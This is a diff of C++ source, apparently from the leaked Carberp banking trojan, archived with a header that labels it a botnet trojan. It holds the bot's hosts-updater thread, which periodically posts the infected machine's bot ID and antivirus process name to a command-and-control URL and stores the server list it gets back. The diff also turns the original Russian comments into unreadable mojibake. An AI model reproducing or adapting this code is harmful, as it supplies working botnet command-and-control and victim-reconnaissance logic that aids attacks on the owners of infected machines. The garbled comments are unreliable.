@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 //---------------------------------------------------------------------------
 
 #pragma hdrstop
@@ -27,8 +38,8 @@ namespace HostsDebugSpace
 THostsUpdater::THostsUpdater()
 	: TBotThread(false)
 {
-//	Interval = 5 * 60 * 1000;   // Интервал в отладке
-	Interval = 30 * 60 * 1000;  // интервал 1 час
+//	Interval = 5 * 60 * 1000;   // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	Interval = 30 * 60 * 1000;  // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ 1 пїЅпїЅпїЅ
 
 	Start();
 }
@@ -42,18 +53,18 @@ THostsUpdater::~THostsUpdater()
 
 void THostsUpdater::DoExecute()
 {
-	// Запускаем цикл загрузки хостов
-	// передаём админке информацию об установленном антивирусе
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	pSleep(4000);
 
-	HOSTSDBG("HostsUpdater", "Запускаем обновление хостов");
+	HOSTSDBG("HostsUpdater", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ");
 
 	while (!Terminated())
 	{
 		DWORD UpdateInterval = Interval;
 		Update(UpdateInterval);
 
-		// Замораживаем поток
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		pSleep(UpdateInterval);
     }
 
@@ -62,7 +73,7 @@ void THostsUpdater::DoExecute()
 
 void THostsUpdater::Update(DWORD &UpdateInterval)
 {
-	// Обновляем список хостов
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
 	PCHAR URL = GetBotScriptURL(SCRIPT_UPDATE_HOSTS);
 	if (!URL)
@@ -79,7 +90,7 @@ void THostsUpdater::Update(DWORD &UpdateInterval)
 		THTTP HTTP;
 	#endif
 
-	// Заполняем поля
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	TBotStrings Fields;
 
 	string AV = GetAntiVirusProcessName();
@@ -88,15 +99,15 @@ void THostsUpdater::Update(DWORD &UpdateInterval)
 	Fields.AddValue("uid", UID.t_str());
 	Fields.AddValue("av",  AV.t_str());
 
-	HOSTSDBG("HostsUpdater", "Загружаем список хостов:\r\nURL: %s\r\nUID: %s\r\nAV: %s", URL, UID.t_str(), AV.t_str());
+	HOSTSDBG("HostsUpdater", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ:\r\nURL: %s\r\nUID: %s\r\nAV: %s", URL, UID.t_str(), AV.t_str());
 
-	// Отправляем запрос
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	HTTP.CheckOkCode = false;
 	string Buf;
 	bool Done = HTTP.Post(URL, &Fields, Buf);
 	if (!Done)
 	{
-		// Не удалось выполнить запрос к серверу
+		// пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		UpdateInterval = 30000;
 		return;
 	}
@@ -110,13 +121,13 @@ void THostsUpdater::Update(DWORD &UpdateInterval)
 
 void THostsUpdater::SaveHosts(const string &Buf)
 {
-	// Сохраняем список хостов
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	TBotStrings H;
 	H.SetText(Buf);
 
 	PHostList List = Hosts::CreateList();
 
-	HOSTSDBG("HostsUpdater", "Загруженные хосты:");
+	HOSTSDBG("HostsUpdater", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ:");
 
     bool Added = false;
 
@@ -144,7 +155,7 @@ void THostsUpdater::SaveHosts(const string &Buf)
 }
 //-----------------------------------------------------------
 
-// Функция запускает автоматическое обновление хостов
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 void StartHostsUpdater()
 {
 	new THostsUpdater();
